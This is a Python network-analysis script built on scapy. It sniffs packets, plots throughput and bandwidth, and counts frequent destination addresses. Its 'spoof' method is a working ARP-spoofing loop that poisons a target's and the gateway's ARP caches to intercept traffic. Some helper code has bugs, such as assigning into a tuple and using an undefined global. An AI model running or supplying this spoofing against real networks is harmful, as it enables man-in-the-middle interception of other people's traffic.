import time
import scapy.all as sc
import matplotlib.pyplot as plt

from typing import IO, List, Tuple

class Analyzer:
    @staticmethod
    def sniff(target_ip: str = None, target_mac = None) -> None:
        def packet_handler(packet):
            if target_ip is None and target_mac is None:
                print(packet.summary())
            elif packet.src == target_mac or packet.dst == target_mac:
                print(packet.summary())
        try:
            if target_ip is not None:
                sc.sniff(filter=f"host {target_ip}", prn=packet_handler)
            else:
                sc.sniff(prn=packet_handler)
        except KeyboardInterrupt:
            print("quit sniffing")
            exit()

    @staticmethod
    def speed(target_ip: str = None, target_mac = None, plot: bool = False, nb_iter: int = 100) -> None:
        import numpy as np
        def _speed() -> float:
            tot_bytes: List[int] = []
            start: float = time.time()
            def analyze_packet(packet) -> None:
                tot_bytes.append(len(packet))
            sc.sniff(count=5, prn=analyze_packet)
            end: float = time.time()
            duration: float = end - start
            speed: float = ((sum(tot_bytes)*8)/duration)/(10**6)
            print(f"speed: {speed} Mbps\nbiggest packet: {max(tot_bytes)} Bytes\nmean = {np.mean(tot_bytes)} Bytes\n--------")
            return speed

        def run() -> None:
            k = 0
            ts: List[float] = [] 
            ss: List[float] = [] 
            while (k < nb_iter):
                if plot:
                    t: float = time.time()
                    s: float = _speed()
                    ts.append(t)
                    ss.append(s)
                    plt.plot(ts, ss, color='black')
                    plt.xlabel("time")
                    plt.ylabel("speed (Mbps)")
                    plt.title("speed = f(t)")
                    plt.pause(0.05)
                    plt.draw()
                else:
                    _speed()
                k += 1
            if plot:
                plt.savefig("speed_vs_time.pdf")
                plt.show()
        run()

    @staticmethod
    def domains(plot: bool = False, nb_iter: int = 100) -> None:
        from collections import Counter
        import socket
        def _domains() -> Counter:
            def analyze_packet(packet) -> None:
                if packet.haslayer('IP'):
                    ip_src = packet['IP'].src
                    ip_dst = packet['IP'].dst
                    domain = ip_dst if '.' in ip_dst else None

                    if domain:
                        frequent_domains[domain] += 1

            frequent_domains: Counter = Counter()
            sc.sniff(filter="ip", prn=analyze_packet, count=100)
            top_n: int = 10
            most_frequent_domains: List[Tuple[str, int]] = frequent_domains.most_common()
            for domain, count in most_frequent_domains:
                print(f"{domain}: {count} times")
            return frequent_domains

        def run() -> None:
            collected_data: Counter = Counter()
            k: int = 0
            while (k < nb_iter):
                frequent_domain: Counter = _domains()
                collected_data += frequent_domain
                k+=1
                print("-------")

            if plot:
                top_n: int = 10
                most_frequent_domains: List[Tuple[str, int]] = collected_data.most_common(top_n)
                domains, counts = zip(*most_frequent_domains)
                for i in range(len(domains)):
                    try:
                        hostname, _, _ = socket.gethostbyaddr(domains[i])
                        domains[i] = hostname
                    except:
                        pass

                plt.barh(domains, counts)
                plt.xlabel("Access Count")
                plt.ylabel("Domain")
                plt.title("Most Frequent Domains")
                plt.show()

        run()

    @staticmethod
    def spoof(target_ip: str) -> None:
        import subprocess
        def get_mac(ip) -> str: 
            arp_request = sc.ARP(pdst = ip) 
            broadcast = sc.Ether(dst ="ff:ff:ff:ff:ff:ff") 
            arp_request_broadcast = broadcast / arp_request 
            answered_list = sc.srp(arp_request_broadcast, timeout = 5, verbose = False)[0] 
            return answered_list[0][1].hwsrc 
          
        def _spoof(target_ip, spoof_ip): 
            packet = sc.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), 
                                                                    psrc = spoof_ip) 
            sc.send(packet, verbose = False) 
          
          
        def restore(destination_ip, source_ip) -> None: 
            destination_mac = get_mac(destination_ip) 
            source_mac = get_mac(source_ip) 
            packet = sc.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac) 
            sc.send(packet, verbose = False) 

        def get_gateway_ip() -> str:
            try:
                result = subprocess.check_output(['route', '-n', 'get', 'default']).decode('utf-8')

                lines = result.split('\n')
                for line in lines:
                    if 'gateway:' in line:
                        gateway_ip = line.split(':')[-1].strip()
                        return gateway_ip
                else:
                    print("Gateway IP not found in the command output.")
            except subprocess.CalledProcessError as e:
                print("Error executing the command:", e)


        gateway_ip = get_gateway_ip()
        print(gateway_ip)
        if not gateway_ip:
            print("Failed to retrieve the gateway IP.")
            exit()
          
        try: 
            sent_packets_count = 0
            while True: 
                _spoof(target_ip, gateway_ip) 
                _spoof(gateway_ip, target_ip) 
                sent_packets_count = sent_packets_count + 2
                print("\r[*] Packets Sent "+str(sent_packets_count), end ="") 
                time.sleep(2)
          
        except KeyboardInterrupt: 
            print("\nCtrl + C pressed.............Exiting") 
            restore(gateway_ip, target_ip) 
            restore(target_ip, gateway_ip) 
            print("[+] Arp Spoof Stopped") 

    @staticmethod
    def bandwith(plot: bool = False) -> None:
        time_intervals = [] 
        bandwidth_usage = []
        start_time = time.time()
        def _bandwith() -> None:
            def analyze_packet(pkt):
                global start_time
                now = time.time()
                time_intervals.append(now - start_time)
                bandwidth_usage.append(len(pkt))
                start_time = now
            sc.sniff(prn=analyze_packet, timeout=60)

        def run() -> None:
            _bandwith()
            if plot:
                plt.plot(time_intervals, bandwidth_usage)
                plt.xlabel("Time (seconds)")
                plt.ylabel("Bandwidth Consumption (bytes)")
                plt.title("Bandwidth Consumption Over Time")
                plt.grid(True)
                plt.show()
        run()

if __name__ == "__main__":
    Analyzer.speed(plot=True, nb_iter=1000)
